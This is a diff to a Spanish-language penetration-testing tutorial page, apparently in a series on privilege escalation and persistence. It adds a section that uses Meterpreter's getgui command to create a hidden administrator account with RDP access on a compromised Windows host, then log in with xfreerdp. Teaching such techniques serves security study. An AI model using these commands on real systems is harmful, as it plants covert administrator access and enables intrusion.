@@ -48,6 +48,19 @@ Los pasos que debemos dar son:
 3. Ocultar el usuario en la pantalla de inicio de sesión de Windows.
 4. Añadir el usuario al grupo de administradores y de RDP.
 
+**Crear el usuairo con meterpreter**
+
+Este comando se encarga de ejecutar todos los pasos mencionados antes.
+
+```bash
+meterpreter > getgui -e -u <usr_name> -p <usr_pass>
+```
+
+Una vez creado el usuario deberiamos tener acceso gráfico al sistema usando:
+
+```bash
+usr@hostname:~# xfreerdp /u:usuario /p:contraseña /v:ip
+```
 
 [⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_linux_pers.md)
 
